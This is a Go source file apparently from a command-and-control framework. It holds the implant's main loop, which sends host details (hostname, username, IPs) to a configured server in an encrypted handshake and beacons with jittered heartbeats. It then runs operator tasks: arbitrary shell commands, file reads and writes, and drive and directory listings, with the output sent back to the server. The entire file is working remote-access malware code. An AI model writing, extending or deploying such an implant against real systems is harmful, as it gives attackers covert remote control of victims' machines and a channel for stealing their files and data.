package implant

import (
	"fmt"
	"log"
	"math/rand"
	"os"
	"time"

	"c2/pkg/protocol"
)

const maxReconnectWait = 5 * time.Minute

// Run is the main implant entry point.
func Run() {
	log.SetFlags(0)
	log.Println("[+] C2 Implant starting...")

	cfg, err := LoadConfig()
	if err != nil {
		log.Printf("[-] Configuration error: %v", err)
		os.Exit(1)
	}

	log.Printf("[+] Agent ID: %s", cfg.AgentID)
	log.Printf("[+] Target: %s:%s", cfg.ServerHost, cfg.ServerPort)

	for {
		if err := runSession(cfg); err != nil {
			log.Printf("[-] Session error: %v", err)
		}
		log.Printf("[*] Reconnecting in 5 seconds...")
		time.Sleep(5 * time.Second)
	}
}

func runSession(cfg *Config) error {
	conn, err := ReconnectLoop(cfg.ServerHost, cfg.ServerPort, maxReconnectWait)
	if err != nil {
		return fmt.Errorf("connect: %w", err)
	}
	defer conn.Close()

	log.Printf("[+] Connected to %s:%s", cfg.ServerHost, cfg.ServerPort)

	// === HANDSHAKE (uses master key) ===

	sysInfo := GatherSysInfo()
	hs := protocol.HandshakeRequest{
		AgentID:  cfg.AgentID,
		Hostname: sysInfo.Hostname,
		OS:       sysInfo.OS,
		Arch:     sysInfo.Arch,
		Username: sysInfo.Username,
		PID:      sysInfo.PID,
		LocalIPs: sysInfo.LocalIPs,
		Version:  cfg.Version,
		ExeDir:   sysInfo.ExeDir,
	}

	if err := SendFrame(conn, protocol.MsgHandshakeRequest, hs, cfg.MasterKey); err != nil {
		return fmt.Errorf("send handshake: %w", err)
	}

	_, plaintext, err := RecvFrame(conn, cfg.MasterKey)
	if err != nil {
		return fmt.Errorf("read handshake response: %w", err)
	}

	var hsResp protocol.HandshakeResponse
	if err := protocol.Deserialize(plaintext, &hsResp); err != nil {
		return fmt.Errorf("deserialize handshake response: %w", err)
	}

	if !hsResp.Accepted {
		return fmt.Errorf("handshake rejected by server")
	}

	log.Printf("[+] Handshake accepted. Heartbeat interval: %ds, Jitter: %d%%",
		hsResp.HeartbeatInterval, hsResp.JitterPercent)

	// Derive per-agent session key (must match server-side HKDF derivation)
	sessionKey, err := DeriveAgentKey(cfg.MasterKey, cfg.AgentID)
	if err != nil {
		return fmt.Errorf("deriving session key: %w", err)
	}

	heartbeatInterval := time.Duration(hsResp.HeartbeatInterval) * time.Second
	jitterPercent := int(hsResp.JitterPercent)

	// === MAIN LOOP (uses session key) ===

	for {
		jitteredSleep(heartbeatInterval, jitterPercent)

		// Send heartbeat
		hb := protocol.Heartbeat{
			AgentID:   cfg.AgentID,
			Timestamp: time.Now().Unix(),
		}
		if err := SendFrame(conn, protocol.MsgHeartbeat, hb, sessionKey); err != nil {
			return fmt.Errorf("send heartbeat: %w", err)
		}

		// Poll for tasks
		tr := protocol.TaskRequest{AgentID: cfg.AgentID}
		if err := SendFrame(conn, protocol.MsgTaskRequest, tr, sessionKey); err != nil {
			return fmt.Errorf("send task request: %w", err)
		}

		msgType, plaintext, err := RecvFrame(conn, sessionKey)
		if err != nil {
			return fmt.Errorf("read task response: %w", err)
		}

		if msgType != protocol.MsgTaskResponse {
			continue
		}

		var taskResp protocol.TaskResponse
		if err := protocol.Deserialize(plaintext, &taskResp); err != nil {
			log.Printf("[-] Deserialize task response: %v", err)
			continue
		}

		for _, task := range taskResp.Tasks {
			start := time.Now()

			switch task.Command {
			case "listdrives":
				log.Printf("[*] Listing drives")
				output, driveErr := ListDrives()
				durationMs := uint32(time.Since(start).Milliseconds())
				result := protocol.TaskResult{
					TaskID:     task.TaskID,
					AgentID:    cfg.AgentID,
					Status:     "completed",
					Output:     output,
					DurationMs: durationMs,
				}
				if driveErr != nil {
					result.Status = "error"
					result.ErrorMsg = driveErr.Error()
				}
				SendFrame(conn, protocol.MsgTaskResult, result, sessionKey)

			case "shell":
				log.Printf("[*] Executing: %s", task.Arguments)
				output, execErr := ExecuteCommand(task.Arguments, task.Timeout)
				durationMs := uint32(time.Since(start).Milliseconds())

				result := protocol.TaskResult{
					TaskID:     task.TaskID,
					AgentID:    cfg.AgentID,
					Status:     "completed",
					Output:     output,
					DurationMs: durationMs,
				}
				if execErr != nil {
					result.Status = "error"
					result.ErrorMsg = execErr.Error()
				}
				if err := SendFrame(conn, protocol.MsgTaskResult, result, sessionKey); err != nil {
					return fmt.Errorf("send task result: %w", err)
				}
				log.Printf("[+] Task %s completed in %dms", task.TaskID, durationMs)

			case "listdir":
				dirPath := task.Arguments
				if dirPath == "" {
					dirPath = "."
				}
				log.Printf("[*] Listing directory: %s", dirPath)
				output, listErr := ListDir(dirPath)
				durationMs := uint32(time.Since(start).Milliseconds())
				result := protocol.TaskResult{
					TaskID:     task.TaskID,
					AgentID:    cfg.AgentID,
					Status:     "completed",
					Output:     output,
					DurationMs: durationMs,
				}
				if listErr != nil {
					result.Status = "error"
					result.ErrorMsg = listErr.Error()
				}
				SendFrame(conn, protocol.MsgTaskResult, result, sessionKey)
				log.Printf("[+] ListDir %s completed in %dms", dirPath, durationMs)

			case "readfile":
				log.Printf("[*] Reading file: %s", task.Arguments)
				output, readErr := ReadFileContent(task.Arguments)
				durationMs := uint32(time.Since(start).Milliseconds())
				result := protocol.TaskResult{
					TaskID:     task.TaskID,
					AgentID:    cfg.AgentID,
					Status:     "completed",
					Output:     output,
					DurationMs: durationMs,
				}
				if readErr != nil {
					result.Status = "error"
					result.ErrorMsg = readErr.Error()
				}
				SendFrame(conn, protocol.MsgTaskResult, result, sessionKey)
				log.Printf("[+] ReadFile %s completed in %dms", task.Arguments, durationMs)

			case "writefile":
				log.Printf("[*] Writing file: args=%d bytes", len(task.Arguments))
				output, writeErr := WriteFileContent(task.Arguments)
				durationMs := uint32(time.Since(start).Milliseconds())
				result := protocol.TaskResult{
					TaskID:     task.TaskID,
					AgentID:    cfg.AgentID,
					Status:     "completed",
					Output:     output,
					DurationMs: durationMs,
				}
				if writeErr != nil {
					result.Status = "error"
					result.ErrorMsg = writeErr.Error()
				}
				SendFrame(conn, protocol.MsgTaskResult, result, sessionKey)
				log.Printf("[+] WriteFile completed in %dms", durationMs)

			case "sleep":
				var newInterval uint32
				fmt.Sscanf(task.Arguments, "%d", &newInterval)
				if newInterval > 0 {
					heartbeatInterval = time.Duration(newInterval) * time.Second
					log.Printf("[*] Sleep interval updated to %ds", newInterval)
				}
				result := protocol.TaskResult{
					TaskID:  task.TaskID,
					AgentID: cfg.AgentID,
					Status:  "completed",
					Output:  []byte(fmt.Sprintf("sleep set to %ds", newInterval)),
				}
				SendFrame(conn, protocol.MsgTaskResult, result, sessionKey)

			case "exit":
				log.Printf("[*] Exit command received")
				result := protocol.TaskResult{
					TaskID:  task.TaskID,
					AgentID: cfg.AgentID,
					Status:  "completed",
					Output:  []byte("exiting"),
				}
				SendFrame(conn, protocol.MsgTaskResult, result, sessionKey)
				os.Exit(0)
			}
		}
	}
}

func jitteredSleep(interval time.Duration, jitterPercent int) {
	jitter := time.Duration(float64(interval) * float64(jitterPercent) / 100.0)
	minSleep := interval - jitter
	maxSleep := interval + jitter
	if minSleep < 0 {
		minSleep = 0
	}
	sleepTime := minSleep + time.Duration(rand.Int63n(int64(maxSleep-minSleep+1)))
	time.Sleep(sleepTime)
}
